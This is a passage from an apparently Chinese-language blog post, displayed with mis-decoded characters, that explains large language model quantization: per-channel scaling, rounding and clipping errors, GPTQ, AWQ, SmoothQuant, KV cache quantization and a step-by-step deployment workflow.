<ul>
<li>å¯¹ç§°é‡åŒ–ï¼ˆSymmetric quantizationï¼‰ â†’ é›¶ç‚¹ä¸º 0ï¼ŒåŒºé—´ä»¥ 0 ä¸ºä¸­å¿ƒå¯¹ç§°
<ul>
<li>ä¼˜ç‚¹ï¼šæ›´ç®€å•ï¼Œæ•ˆç‡æé«˜</li>
<li>å¸¸ç”¨äºæƒé‡</li>
</ul>
</li>
<li>éå¯¹ç§°é‡åŒ–ï¼ˆAsymmetric quantizationï¼‰ â†’ é›¶ç‚¹å¯è°ƒï¼Œæ­£è´ŸèŒƒå›´ä¸ä¸€å®šç›¸ç­‰
<ul>
<li>ä¼˜ç‚¹ï¼šèƒ½æ›´å¥½åœ°æ•æ‰åæ€åˆ†å¸ƒ</li>
<li>å¸¸ç”¨äºæ¿€æ´»å€¼ï¼ˆactivationsï¼‰ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸ä¸æ˜¯ä»¥ 0 ä¸ºä¸­å¿ƒçš„</li>
</ul>
</li>
</ul>
<h3 data-id="heading-7"><strong>3.3 æŒ‰å¼ é‡é‡åŒ– vs æŒ‰é€šé“é‡åŒ–ï¼šç²’åº¦å¾ˆé‡è¦</strong></h3>
<p>èµ·åˆï¼Œæˆ‘å°è¯•äº†æŒ‰å¼ é‡é‡åŒ–ï¼ˆper-tensor quantizationï¼‰ï¼šæ•´ä¸ªæƒé‡çŸ©é˜µä½¿ç”¨ä¸€å¥—ç¼©æ”¾å› å­å’Œé›¶ç‚¹ã€‚å¾ˆç®€å•ï¼Œä½†æœ‰æ—¶ä¼šå‡ºç°ç¾éš¾æ€§å¤±æ•ˆã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸º Transformer å¾ˆæŒ‘å‰” â€”â€” æƒé‡çŸ©é˜µä¸­æœ‰äº›è¡Œçš„æ•°å€¼å¾ˆå¤§ï¼Œæœ‰äº›åˆ™å¾ˆå°ã€‚è‹¥æ•´è¡Œå…±ç”¨ä¸€å¥—ç¼©æ”¾å› å­ï¼Œç»“æœä¼šæ˜¯ï¼š</p>
<ul>
<li>å°æ•°å€¼è¢«æŒ¤è¿›åŒä¸€ä¸ªåŒºé—´ï¼ˆå¯¼è‡´ç²¾åº¦æŸå¤±ï¼‰</li>
<li>æˆ–å¤§æ•°å€¼è¢«æˆªæ–­ï¼ˆäº§ç”Ÿå·¨å¤§è¯¯å·®ï¼‰</li>
</ul>
<p>è§£å†³æ–¹æ¡ˆï¼ŸæŒ‰é€šé“ï¼ˆper-channelï¼Œå³æŒ‰è¡Œï¼‰é‡åŒ–ã€‚</p>
<ul>
<li>æ¯ä¸€è¡Œéƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ç¼©æ”¾å› å­ï¼ˆå’Œå¯èƒ½çš„é›¶ç‚¹ï¼‰</li>
<li>ä¿ç•™äº†æ•°å€¼çš„ç›¸å¯¹å·®å¼‚</li>
<li>ä¸å¸¦æ¥çš„æ”¶ç›Šç›¸æ¯”ï¼Œå…¶é¢å¤–çš„å†…å­˜å¼€é”€å¾®ä¹å…¶å¾®</li>
</ul>
<h3 data-id="heading-8"><strong>3.4 å–æ•´ä¸æˆªæ–­ï¼šå¾®å°è¯¯å·®ï¼Œé‡å¤§å½±å“</strong></h3>
<p>é‡åŒ–å¹¶éé­”æ³•ã€‚å®ƒä¼šå¼•å…¥ä¸¤ç±»è¯¯å·®ï¼š</p>
<ul>
<li>å–æ•´è¯¯å·®ï¼ˆRounding errorï¼‰ â†’ å®é™…å€¼ä¸å…¶æœ€æ¥è¿‘çš„é‡åŒ–åŒºé—´å€¼ä¹‹é—´çš„å·®å¼‚</li>
<li>æˆªæ–­è¯¯å·®ï¼ˆClipping errorï¼‰ â†’ å½“æ•°å€¼è¶…å‡ºå¯è¡¨ç¤ºèŒƒå›´æ—¶è¢«å¼ºè¡Œè£å‰ª</li>
</ul>
<p>åƒ GPTQ æˆ– SmoothQuant è¿™æ ·çš„ç°ä»£ LLM é‡åŒ–æ–¹æ¡ˆï¼Œæ ¸å¿ƒå°±æ˜¯é€šè¿‡å·§å¦™çš„å–æ•´æ–¹æ³•æˆ–å±‚é—´é‡å¹³è¡¡ï¼ˆrebalancingï¼‰æ¥æœ€å°åŒ–è¿™äº›è¯¯å·®ï¼ˆåé¢ä¼šç»†è¯´ï¼‰ã€‚</p>
<h3 data-id="heading-9"><strong>3.5 å¦‚ä½•é€‰æ‹©é‡åŒ–ç²¾åº¦</strong></h3>
<p>è¿™æ˜¯æˆ‘æ¯å¤©éƒ½è¦é¢å¯¹çš„é—®é¢˜ï¼š</p>
<p>FP32 â†’ INT8 â†’ INT4 â†’ â€¦ æˆ‘æœ€å¤šèƒ½å‹ç¼©åˆ°å¤šå°‘ä½ï¼Ÿ</p>
<p>æˆ‘çš„ç»éªŒæ˜¯ï¼šé€šå¸¸å…ˆä» INT8 å¼€å§‹ â€”â€” å®‰å…¨åˆç»æµï¼Œåªæœ‰åœ¨é‡‡ç”¨é«˜çº§å–æ•´æŠ€æœ¯æ—¶ï¼Œæ‰å°è¯• INT4ã€‚ä½äº 4 æ¯”ç‰¹çš„é‡åŒ–å°šå¤„äºå®éªŒé˜¶æ®µï¼Œé™¤éä½ å‡†å¤‡å¥½å¯¹æ¨¡å‹è¿›è¡Œå¾®è°ƒï¼Œå¦åˆ™é£é™©å¾ˆé«˜ã€‚</p>
<h3 data-id="heading-10"><strong>3.6 ä¸€ä¸ªç›´è§‚çš„æ¯”å–»</strong></h3>
<p>è¿™æ˜¯æˆ‘çš„æ€ç»´æ¨¡å‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d50ef1b6cae46f3970a04e906d25b13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766102031&amp;x-signature=ZE1xCmALV20Ifl%2BuURelktKD7D4%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>æ¯ä¸ªæƒé‡ = ä¸€ä»¶è¡£æœ</li>
<li>æ¯ä¸ªé‡åŒ–åŒºé—´ = è¡Œæç®±é‡Œçš„ä¸€ä¸ªéš”å±‚</li>
<li>ç¼©æ”¾å› å­ = ä½ çš„éš”å±‚æœ‰å¤šå¤§</li>
<li>é›¶ç‚¹ = ç¬¬ä¸€ä¸ªéš”å±‚ä»å“ªå„¿å¼€å§‹</li>
</ul>
<h2 data-id="heading-11"><strong>04 é‡åŒ–ä¸ºä½•æœ‰æ—¶ä¼šå¸¦æ¥å‰¯ä½œç”¨</strong></h2>
<p>é‡åŒ–å¹¶éé­”æ³• â€”â€” å¦‚æœæˆ‘ä»¬ä¸å¤Ÿè°¨æ…ï¼Œå®ƒå¯èƒ½ä¼šå¾®å¦™åœ°ç ´åæ¨¡å‹æ€§èƒ½ã€‚è¿™äº›è¯¯å·®ä¸»è¦æ¥æºäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60fce357544647f7bbef65bfbe8b3b8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766102031&amp;x-signature=iQaUvaCr6%2FpNLO6kTie2XNWKhYw%3D" alt="image.png" loading="lazy"/></p>
<p><strong>1ï¼‰å–æ•´è¯¯å·®ï¼šå°† FP32 ç²¾åº¦çš„æ•°å€¼æ˜ å°„åˆ° INT8/INT4 ä¼šå¼•å…¥å¾®å°çš„ç²¾åº¦æŸå¤±ã€‚</strong></p>
<ul>
<li>å•æ¬¡è¯¯å·®å¾ˆå°ï¼Œä½†åœ¨ Transformer ä¸­ï¼Œå¾®å°çš„å–æ•´è¯¯å·®ä¼šè·¨å±‚ç´¯ç§¯ã€‚</li>
<li>ç»“æœï¼šå¯¼è‡´æ³¨æ„åŠ›åˆ†å¸ƒæˆ–è¯å…ƒæ¦‚ç‡å‘ç”Ÿç»†å¾®å˜åŒ–ï¼Œæœ‰æ—¶ç”šè‡³ä¼šå¼•å‘æ¨¡å‹å¹»è§‰ã€‚</li>
</ul>
<p><strong>2ï¼‰æˆªæ–­è¯¯å·®ï¼šå¼‚å¸¸å€¼ä¼šè¿«ä½¿é‡åŒ–å› å­å˜å¤§ã€‚</strong></p>
<ul>
<li>è¿™ä½¿å¾—å¤§å¤šæ•°æƒé‡è¢«å‹ç¼©åˆ°å°‘æ•°å‡ ä¸ªåŒºé—´å†… â†’ æœ‰æ•ˆç²¾åº¦å¤§å¹…ä¸‹é™ã€‚</li>
<li>å®ä¾‹ï¼šLayerNorm å±‚ä¸­ä¸€ä¸ªç½•è§çš„å¤§æ¿€æ´»å€¼è‹¥è¢«æˆªæ–­ï¼Œå°±å¯èƒ½å¯¼è‡´æ¨¡å‹ä¸ç¨³å®šã€‚</li>
</ul>
<p>å¿«é€Ÿåº”å¯¹ï¼š<strong>é‡‡ç”¨ç™¾åˆ†ä½æ•°æ³•ç¡®å®šç¼©æ”¾å› å­ï¼Œä»£æ›¿æå€¼æ³•ï¼Œæˆ–å¯¹æ•æ„Ÿå±‚ç‰¹æ®Šå¤„ç†ã€‚</strong></p>
<p><strong>3ï¼‰ç½‘ç»œå±‚æ•æ„Ÿåº¦å·®å¼‚ï¼šå¹¶éæ‰€æœ‰ç½‘ç»œå±‚å¯¹é‡åŒ–çš„ååº”éƒ½ç›¸åŒï¼š</strong></p>
<ul>
<li>æ³¨æ„åŠ›æŠ•å½±å±‚ï¼ˆAttention projectionsï¼‰ &amp; è¯­è¨€æ¨¡å‹å¤´ï¼ˆLM headï¼‰ â†’ é«˜åº¦æ•æ„Ÿ</li>
<li>LayerNorm å±‚ â†’ æåº¦æ•æ„Ÿï¼Œé€šå¸¸éœ€ä¿æŒ FP16 ç²¾åº¦</li>
<li>MLP å±‚ â†’ ä¸­ç­‰æ•æ„Ÿï¼Œå¯è€å— INT8/INT4</li>
<li>åµŒå…¥å±‚ï¼ˆEmbeddingsï¼‰ â†’ ä¸­é«˜åº¦æ•æ„Ÿï¼Œéœ€è¦å°å¿ƒå¤„ç†</li>
</ul>
<h2 data-id="heading-12"><strong>05 é«˜çº§é‡åŒ–æŠ€æœ¯</strong></h2>
<p>åœ¨ç»å†äº†å–æ•´ã€æˆªæ–­å’Œæ•æ„Ÿç½‘ç»œå±‚å¸¦æ¥çš„ç§ç§æŒ‘æˆ˜åï¼Œç ”ç©¶äººå‘˜å’Œå·¥ç¨‹å¸ˆä»¬å¼€å‘å‡ºä¸€äº›å·§å¦™çš„æ–¹æ³•ï¼Œä½¿å¾— LLM å³ä½¿åœ¨ 4 ä½ç²¾åº¦ä¸‹ä¹Ÿèƒ½è¡¨ç°å‡ºè‰²ã€‚ä»¥ä¸‹æ˜¯æˆ‘äº†è§£åˆ°çš„ä¸€äº›æ ¸å¿ƒæŠ€æœ¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f5f18678ed94aa699bb4bcc03561b67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766102031&amp;x-signature=oRtuPnyUDs%2Fl0nQKmsWEjkGI8G0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-13"><strong>5.1 GPTQï¼šåŸºäº Hessian çŸ©é˜µçš„æ™ºèƒ½å–æ•´</strong></h3>
<ul>
<li>æ ¸å¿ƒæ€æƒ³ï¼šå¹¶éæ‰€æœ‰å–æ•´è¯¯å·®éƒ½åŒç­‰é‡è¦ã€‚æŸäº›æƒé‡å¯¹æ¨¡å‹è¾“å‡ºçš„å½±å“æ›´å¤§ã€‚</li>
<li>GPTQ é€šè¿‡åˆ†ææ¨¡å‹çš„äºŒé˜¶æ•æ„Ÿåº¦ï¼ˆHessian çŸ©é˜µï¼‰æ¥è¯†åˆ«å“ªäº›æƒé‡å¯ä»¥å®‰å…¨åœ°è¿›è¡Œå–æ•´å¤„ç†ã€‚</li>
<li>æ•ˆæœï¼šå³ä½¿åœ¨å¤§æ¨¡å‹ä¸­ï¼ŒINT4 æƒé‡é‡åŒ–ä¹Ÿèƒ½å‡ ä¹ä¿æŒåŸå§‹ç²¾åº¦ã€‚</li>
</ul>
<h3 data-id="heading-14"><strong>5.2 AWQï¼šæ¿€æ´»æ„ŸçŸ¥é‡åŒ–</strong></h3>
<ul>
<li>æ¿€æ´»å€¼ä¸æƒé‡ç›¸äº’ä½œç”¨ï¼Œå¦‚æœåœ¨å¯¹æƒé‡è¿›è¡Œå–æ•´æ—¶ä¸è€ƒè™‘æ¿€æ´»å€¼çš„åˆ†å¸ƒèŒƒå›´ï¼Œå¯èƒ½ä¼šæŸå®³æ¨¡å‹æ€§èƒ½ã€‚</li>
<li>AWQ æ ¹æ®æ¿€æ´»å€¼çš„ç»Ÿè®¡ç‰¹å¾æ¥è°ƒæ•´æƒé‡é‡åŒ–ç­–ç•¥ï¼Œä»è€Œé™ä½æ¨ç†è¿‡ç¨‹ä¸­çš„è¯¯å·®é£é™©ã€‚</li>
</ul>
<h3 data-id="heading-15"><strong>5.3 SmoothQuantï¼šå±‚é—´å¹³è¡¡æŠ€æœ¯</strong></h3>
<ul>
<li>ç—›ç‚¹ï¼šæŸäº›ç½‘ç»œå±‚çš„æ¿€æ´»å€¼èŒƒå›´è¿‡å¤§ï¼Œå¯¼è‡´å‡åŒ€é‡åŒ–æ•ˆç‡ä½ä¸‹ã€‚</li>
<li>SmoothQuant ä¼šåœ¨ä¸åŒå±‚ä¹‹é—´å¯¹æƒé‡å’Œæ¿€æ´»å€¼è¿›è¡Œé‡æ–°ç¼©æ”¾ï¼Œä½†ä¿è¯å®ƒä»¬ç›¸ä¹˜åçš„ç»“æœï¼ˆå³æ¨¡å‹çš„è¾“å‡ºï¼‰ä¿æŒä¸å˜ã€‚</li>
<li>ä¼˜åŠ¿ï¼šå®ç°æ›´å¹³æ»‘çš„é‡åŒ–ï¼Œå¤§å¹…å‡å°ç²¾åº¦æŸå¤±ã€‚</li>
</ul>
<h3 data-id="heading-16"><strong>5.4 HQQ ä¸æ··åˆæ–¹æ³•</strong></h3>
<ul>
<li>è¯¥æ–¹æ³•å°† Hessian ä¿¡æ¯ä¸æ··åˆç²¾åº¦æˆ–åˆ†ç»„é‡åŒ–æŠ€æœ¯ç›¸ç»“åˆã€‚</li>
<li>æ€è·¯ï¼šå¯¹å±‚ä¸­â€œå®‰å…¨â€çš„éƒ¨åˆ†ä½¿ç”¨ä½æ¯”ç‰¹ç²¾åº¦ï¼Œè€Œå¯¹æ•æ„Ÿéƒ¨åˆ†ä¿ç•™æ›´é«˜ç²¾åº¦ã€‚</li>
<li>è¯¥æŠ€æœ¯åœ¨å¯¹ç”Ÿäº§çº§æ¨¡å‹è¿›è¡Œ INT4 æˆ–æ›´ä½æ¯”ç‰¹é‡åŒ–æ—¶å°¤ä¸ºå®ç”¨ã€‚</li>
</ul>
<h3 data-id="heading-17"><strong>5.5 æ··åˆç²¾åº¦å›é€€æœºåˆ¶</strong></h3>
<ul>
<li>æœ‰äº›ç½‘ç»œå±‚å¤©ç”ŸæŠ—æ‹’è¢«é‡åŒ–ã€‚</li>
<li>å¸¸è§ç­–ç•¥ï¼šå°†Â LayerNormã€LM Headï¼ˆè¯­è¨€æ¨¡å‹è¾“å‡ºå¤´ï¼‰ä»¥åŠéƒ¨åˆ†åµŒå…¥å±‚ç»´æŒåœ¨Â FP16Â ç²¾åº¦ï¼Œå…¶ä½™éƒ¨åˆ†åˆ™é‡åŒ–ä¸ºÂ INT4/INT8ã€‚</li>
<li>æƒè¡¡ï¼šè™½ç•¥å¾®å¢åŠ å†…å­˜å ç”¨ï¼Œå´èƒ½æ¢æ¥æ¨¡å‹è´¨é‡çš„å¤§å¹…æå‡ã€‚</li>
</ul>
<h2 data-id="heading-18"><strong>06 KV ç¼“å­˜é‡åŒ–</strong></h2>
<p>å¦‚æœä½ æ›¾å°è¯•ç”¨å¤§è¯­è¨€æ¨¡å‹å¤„ç†é•¿ä¸Šä¸‹æ–‡ä»»åŠ¡ï¼Œä¸€å®šå¯¹æ­¤æ·±æœ‰ä½“ä¼šï¼šKV ç¼“å­˜ä¼šç–¯ç‹‚å ç”¨å†…å­˜ã€‚æ¯ä¸ªç”Ÿæˆçš„è¯å…ƒéƒ½è¦ä¸ºæ¯ä¸€å±‚ä¿å­˜é”®ï¼ˆKeyï¼‰çŸ©é˜µå’Œå€¼ï¼ˆValueï¼‰çŸ©é˜µï¼Œè€Œæ¨¡å‹åŠ¨è¾„æ‹¥æœ‰æ•°åäº¿å‚æ•°ï¼Œå†…å­˜å¾ˆå¿«å°±ä¼šè¢«åƒå…‰ã€‚é‡åŒ–æŠ€æœ¯æ­¤æ—¶ä¾¿æ´¾ä¸Šç”¨åœºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c754dbca68da450d862d142b00f19dbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766102031&amp;x-signature=6CRawmKZpR087j6QJKKyHy2ffKQ%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-19"><strong>6.1 ä¸ºä»€ä¹ˆ KV ç¼“å­˜å¾ˆé‡è¦</strong></h3>
<ul>
<li>åœ¨è§£ç è¿‡ç¨‹ä¸­ï¼ŒTransformer ä¼šä¸ºæ¯ä¸ªå†å²è¯å…ƒå­˜å‚¨é”®ï¼ˆKï¼‰å’Œå€¼ï¼ˆVï¼‰ã€‚</li>
<li>è¿™æ ·å°±èƒ½åœ¨è®¡ç®—æ³¨æ„åŠ›æ—¶è®¿é—®æ‰€æœ‰å…ˆå‰è¯å…ƒï¼Œæ— éœ€é‡å¤è®¡ç®—ã€‚</li>
<li>é—®é¢˜åœ¨äºï¼šå¯¹äºé•¿æç¤ºè¯ï¼ˆå¦‚ 8K+ è¯å…ƒï¼‰å’Œè¶…å¤§æ¨¡å‹ï¼ˆ70B+ å‚æ•°ï¼‰ï¼Œç¼“å­˜å¯èƒ½å ç”¨å¤§éƒ¨åˆ† GPU å†…å­˜ã€‚</li>
</ul>
<h3 data-id="heading-20"><strong>6.2 INT8/INT4 KV ç¼“å­˜</strong></h3>
<ul>
<li>å°†é”®å’Œå€¼ä»¥æ›´ä½ç²¾åº¦ï¼ˆå¦‚ INT8 æˆ– INT4ï¼‰å­˜å‚¨ï¼Œå¯å¤§å¹…å‡å°‘å†…å­˜å ç”¨ã€‚</li>
<li>ç²¾åº¦æŸå¤±æå°ï¼Œå› ä¸ºæ³¨æ„åŠ›æœºåˆ¶å¯¹ K/V çŸ©é˜µä¸­çš„å¾®å°å–æ•´å™ªå£°å…·æœ‰è¾ƒå¼ºçš„å®¹å¿åº¦ã€‚</li>
</ul>
<p>ç”¨ä¸€ç§æ›´ä¸ºç›´è§‚çš„æ–¹å¼ç†è§£ï¼šæ³¨æ„åŠ›æœºåˆ¶åŒ…å®¹æ€§å¼ºï¼Œå°±åƒå¬ 128kbps çš„æ­Œæ›² â€”â€” ç»†èŠ‚è™½æœ‰æŸå¤±ï¼Œä½†æ•´ä½“æ—‹å¾‹ä¾æ—§æ¸…æ™°ã€‚</p>
<h3 data-id="heading-21"><strong>6.3 åé‡åŒ– or ç›´æ¥åœ¨æ•´æ•°åŸŸä¸­è¿›è¡Œè®¡ç®—</strong></h3>
<p>ä¸¤ç§å®ç°æ–¹å¼ï¼š</p>
<p>1ï¼‰åŠ¨æ€åé‡åŒ–ï¼ˆDequant on-the-flyï¼‰</p>
<ul>
<li>åœ¨è®¡ç®—æ³¨æ„åŠ›æ—¶ï¼Œå°† INT8/INT4 ä¸´æ—¶è½¬å› FP16</li>
<li>æœ‰è½»å¾®è®¡ç®—å¼€é”€ï¼Œä½†å†…å­˜æ•ˆç‡é«˜</li>
</ul>
<p>2ï¼‰åœ¨æ•´æ•°åŸŸä¸­ç›´æ¥è®¡ç®—ï¼ˆCompute directly in integer domainï¼‰</p>
<ul>
<li>å……åˆ†åˆ©ç”¨æ”¯æŒä½ç²¾åº¦è¿ç®—çš„ç¡¬ä»¶ï¼ˆå¦‚æ”¯æŒ INT8 çš„ GPUï¼‰</li>
<li>é€Ÿåº¦æ›´å¿«ã€å†…å­˜æ•°æ®ç§»åŠ¨é‡æ›´å°‘ï¼Œä½†å·¥ç¨‹å®ç°ç¨å¤æ‚</li>
</ul>
<h3 data-id="heading-22"><strong>6.4 å®ç”¨å»ºè®®</strong></h3>
<ul>
<li>å°† KV ç¼“å­˜é‡åŒ–ä¸åˆ†å±‚æ··åˆç²¾åº¦ç»“åˆä½¿ç”¨ï¼Œæ•ˆæœæœ€ä½³ã€‚</li>
<li>INT8 KV ç¼“å­˜é€šå¸¸å¾ˆå®‰å…¨ï¼›è‹¥ä½¿ç”¨ INT4ï¼Œå»ºè®®é…åˆé«˜çº§å–æ•´ç­–ç•¥ï¼ˆå¦‚ GPTQ æˆ– AWQï¼‰ã€‚</li>
<li>åŠ¡å¿…åœ¨é•¿åºåˆ—ä¸Šè¿›è¡Œæµ‹è¯• â€”â€” çŸ­ä¸Šä¸‹æ–‡çš„åŸºå‡†æµ‹è¯•æ— æ³•æš´éœ²æ½œåœ¨çš„æ¨¡å‹å¹»è§‰æˆ–è¯å…ƒé”™ä½é—®é¢˜ã€‚</li>
</ul>
<h2 data-id="heading-23"><strong>07 é‡åŒ–æŠ€æœ¯å®æˆ˜å·¥ä½œæµ</strong></h2>
<p>åœ¨æ·±å…¥ç ”ç©¶äº†é‡åŒ–çš„åŸç†ã€è¯¯å·®æ¥æºå’Œé«˜çº§æŠ€å·§åï¼Œæˆ‘æ„è¯†åˆ°çœŸæ­£çš„æŒ‘æˆ˜ä¸åœ¨äºç†è§£é‡åŒ–ï¼Œè€Œåœ¨äºå¦‚ä½•å®‰å…¨åœ°å®æ–½å®ƒè€Œä¸ç ´åæ¨¡å‹ã€‚ä»¥ä¸‹æ˜¯æˆ‘çš„å®è·µæ–¹æ³•ã€‚</p>
<h3 data-id="heading-24"><strong>7.1 å‡†å¤‡æ ¡å‡†æ•°æ®é›†</strong></h3>
<p>åœ¨è°ƒæ•´ä»»ä½•æƒé‡ä¹‹å‰ï¼Œé¦–å…ˆå‡†å¤‡ä¸€ä¸ªä½“é‡å°ä½†å…·æœ‰ä»£è¡¨æ€§çš„æ•°æ®é›†ï¼š</p>
<ul>
<li>åŒ…å« 100-500 æ¡è¦†ç›–æ¨¡å‹å…¸å‹ä»»åŠ¡çš„è¾“å…¥åºåˆ—</li>
<li>ç›®çš„ï¼šè®°å½•æ¯ä¸€å±‚æ¿€æ´»å€¼çš„æ•°å€¼èŒƒå›´å’Œåˆ†å¸ƒå½¢æ€ï¼Œä»è€Œä¸ºåç»­çš„é‡åŒ–è¿‡ç¨‹æä¾›å‡†ç¡®çš„ç»Ÿè®¡ä¾æ®ã€‚</li>
<li>åŸå› ï¼šå¦‚æœæ¨ç†æ—¶çš„æ¿€æ´»å€¼åˆ†å¸ƒä¸æ ¡å‡†æ•°æ®åå·®è¿‡å¤§ï¼ŒINT4 é‡åŒ–å¯èƒ½ä¼šå¤±è´¥</li>
</ul>
<h3 data-id="heading-25"><strong>7.2 é€å±‚ç¡®å®šç²¾åº¦</strong></h3>
<p>å¹¶éæ‰€æœ‰ç½‘ç»œå±‚éƒ½èƒ½åŒç­‰ç¨‹åº¦åœ°é€‚åº” INT4 ç²¾åº¦ï¼š</p>
<ul>
<li>MLP å±‚å’Œå¤§å¤šæ•°æ³¨æ„åŠ›æƒé‡ â†’ é‡‡ç”¨ INT4</li>
<li>åµŒå…¥å±‚ â†’ è‹¥å­˜åœ¨é£é™©åˆ™é‡‡ç”¨ INT8</li>
<li>LayerNormã€LM Head åŠæœ‰æ—¶é¦–ä¸ªæŠ•å½±å±‚ â†’ å›é€€è‡³ FP16 ç²¾åº¦</li>
</ul>
<h3 data-id="heading-26"><strong>7.3 æ‰§è¡Œé‡åŒ–æ“ä½œ</strong></h3>
<ul>
<li>é¦–å…ˆè¿›è¡Œè®­ç»ƒåé‡åŒ–ï¼ˆPTQï¼‰ï¼Œé€šå¸¸å°†æ‰€æœ‰æƒé‡è½¬ä¸º INT8ï¼Œæ£€æŸ¥æ¨¡å‹è¾“å‡º</li>
<li>ç„¶åä½¿ç”¨ GPTQ æˆ– AWQ é€æ­¥å°† MLP /æ³¨æ„åŠ›å±‚é™è‡³ INT4</li>
<li>å§‹ç»ˆå°†æ•æ„Ÿç½‘ç»œå±‚ä¿æŒåœ¨ FP16 ç²¾åº¦</li>
</ul>
<p>æ­¤é˜¶æ®µæ˜¯è¿­ä»£è¿‡ç¨‹ï¼šåº”ç”¨é‡åŒ– â†’ æµ‹è¯• â†’ è°ƒæ•´ç½‘ç»œå±‚ç²¾åº¦</p>
<h3 data-id="heading-27"><strong>7.4 è¯„ä¼°ä¸è°ƒè¯•</strong></h3>
<p>è¿™æ˜¯ç†è®ºç…§è¿›ç°å®çš„ç¯èŠ‚ï¼š</p>
<ul>
<li>ä½¿ç”¨çœŸå®åœºæ™¯çš„æç¤ºè¯è¿›è¡Œæµ‹è¯•ï¼Œè€Œéä»…ä¾èµ–åŸºå‡†æ•°æ®é›†</li>
<li>æ£€æŸ¥æ˜¯å¦å‡ºç°å¹»è§‰ã€è¯å…ƒé”™ä½æˆ–æ¨ç†èƒ½åŠ›ä¸‹é™</li>
<li>è‹¥æŸç½‘ç»œå±‚è¡¨ç°å¼‚å¸¸ï¼Œå¯é€‰æ‹©æ€§åœ°æ¢å¤å…¶ç²¾åº¦æˆ–å°è¯•æŒ‰é€šé“ç¼©æ”¾</li>
</ul>
<h3 data-id="heading-28"><strong>7.5 å¾®è°ƒï¼ˆå¯é€‰æ­¥éª¤ï¼‰</strong></h3>
<p>å¯¹äºæ¿€è¿›çš„ä½æ¯”ç‰¹é‡åŒ–ï¼ˆå¦‚ INT4ã€æ··åˆ 3-4 ä½é‡åŒ–ï¼‰ï¼Œæœ‰æ—¶éœ€è¦è¿›è¡Œè½»é‡çº§çš„é‡åŒ–æ„ŸçŸ¥å¾®è°ƒï¼š</p>
<ul>
<li>åœ¨æ ¡å‡†æ•°æ®ä¸Šè®­ç»ƒå‡ ä¸ª epoch</li>
<li>è®©æ¨¡å‹é€‚åº”é‡åŒ–å¼•å…¥çš„å™ªå£°</li>
<li>é€šå¸¸èƒ½å°† INT4 çš„æ€§èƒ½è¡¨ç°æå‡è‡³æ¥è¿‘ FP16 æ°´å¹³</li>
</ul>
<h3 data-id="heading-29"><strong>7.6 éƒ¨ç½²å°±ç»ª</strong></h3>
<p>å½“é‡åŒ–ç¨³å®šåï¼š</p>
<ul>
<li>KV ç¼“å­˜ä¹Ÿè¿›è¡Œé‡åŒ–ï¼ˆINT8/INT4ï¼‰ï¼Œæå‡å†…å­˜æ•ˆç‡</li>
<li>å¯¹é‚£äº›è¢«ç‰¹æ„ä¿ç•™ä¸ºè¾ƒé«˜ç²¾åº¦çš„å±‚ï¼Œå·²é‡‡å–ä¿æŠ¤æªæ–½</li>
<li>æ¨¡å‹å·²é€šè¿‡é•¿ä¸Šä¸‹æ–‡ä»»åŠ¡æµ‹è¯•</li>
</ul>
<p>æœ€ç»ˆæˆæœï¼šå†…å­˜å ç”¨æ›´å°ï¼Œæ¨ç†é€Ÿåº¦æ›´å¿«ï¼Œç²¾åº¦æŸå¤±å¾®ä¹å…¶å¾®ã€‚å½“ç¬¬ä¸€æ¬¡çœ‹åˆ° 70B å‚æ•°çš„æ¨¡å‹åœ¨å•å¼  GPU ä¸Šæµç•…è¿è¡Œæ—¶ï¼Œé‚£ç§æ„Ÿè§‰å ªç§°ç¥å¥‡ã€‚</p>
<h2 data-id="heading-30"><strong>08 åº”ç”¨åœºæ™¯</strong></h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d618a8742c514060bc97d26ca460770c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766102031&amp;x-signature=uBZ6sw9uGFogqzFSU%2BxSu%2FZSPNw%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>ç«¯ä¾§ AIï¼ˆOn-Device AIï¼‰</strong> ï¼šé‡åŒ–è®©æˆ‘èƒ½ç›´æ¥åœ¨ç¬”è®°æœ¬ã€è¾¹ç¼˜è®¾å¤‡ç”šè‡³æ‰‹æœºä¸Šè¿è¡Œå¤§è¯­è¨€æ¨¡å‹ã€‚è¿‡å»éœ€è¦å¤šå¡ GPU æœåŠ¡å™¨çš„æ¨¡å‹ï¼Œå¦‚ä»Šå•å¼  GPU å°±èƒ½è£…ä¸‹ï¼Œè®© AI èƒ½å¤Ÿè¿›è¡Œå®æ—¶äº¤äº’ï¼Œæ‘†è„±äº‘ç«¯å»¶è¿Ÿã€‚æˆ‘ç”¨å®ƒæ¥åšç¬”è®°ã€è¿›è¡Œä»£ç è¡¥å…¨ã€å½“ç¦»çº¿èŠå¤©åŠ©æ‰‹ â€”â€” å°±åƒæŠŠä¸€å°è¶…çº§è®¡ç®—æœºè£…è¿›äº†èƒŒåŒ…é‡Œã€‚</li>
